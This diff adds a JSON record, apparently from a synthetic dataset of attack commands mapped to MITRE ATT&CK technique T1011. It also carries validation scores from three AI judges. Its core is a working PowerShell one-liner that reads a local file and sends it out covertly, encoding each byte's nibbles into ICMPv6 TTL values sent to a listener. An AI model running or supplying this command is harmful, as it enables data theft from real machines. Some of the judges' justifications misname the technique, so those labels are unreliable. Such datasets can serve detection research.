@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:abba::1'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d -Count 1 -TimeToLive (70 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $d -Count 1 -TimeToLive (100 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Uses ICMPv6 TTL ranges to encode high/low nibbles of each byte, transmitting over ICMPv6 as an alternate medium aligned to T1011.",
+  "rationale_steps": [
+    "Split each byte into two 4-bit values.",
+    "Map nibbles into two distinct TTL ranges for clarity.",
+    "Send sequential ICMPv6 echos that a passive listener can reconstruct."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-3c199886",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignments, valid method calls, and correct foreach loop syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over an alternative channel (ICMPv6), it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than T1572 (Protocol Tunneling) as it doesn't use system scripts as proxies for execution.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:24:02.297951Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, uses correct syntax for variable assignments, file operations, bitwise operators, and cmdlet parameters, with balanced delimiters.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration via ICMPv6 TTL manipulation, which is not T1011 (System Script Proxy Execution); it does not abuse trusted scripts to proxy execution.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T04:24:10.215155Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid operators and parameters, and proper statement separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Plausibly exfiltrates data via ICMPv6 by encoding nibbles in hop-limit (TTL) using Test-Connection, though successful decoding relies on stable/known hop counts and it does not align with the provided 'System Script Proxy Execution' description.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:24:38.242418Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
